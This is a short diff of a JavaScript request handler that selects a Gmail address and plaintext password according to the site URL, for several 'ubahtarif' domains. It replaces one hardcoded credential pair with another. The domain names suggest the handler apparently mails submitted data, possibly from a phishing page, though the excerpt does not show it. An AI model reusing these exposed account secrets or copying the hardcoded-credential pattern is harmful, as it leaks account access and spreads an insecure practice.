@@ -7,10 +7,9 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
 
-    if(url == 'https://ubahtarif.herokuapp.com/ '){
-
-        email = 'orbitorbit799@gmail.com';
-        pass = 'ahghpmbdwokimqim'; 
+    if(url == 'ubahtarif.vercel.app'){
+        email = 'sxxrhrh@gmail.com';
+        pass = 'xefngcmysbpaxufj'; 
 
     } else if(url == 'ubahan-tarif.vercel.app'){
         email = 'giozx123456@gmail.com' ;
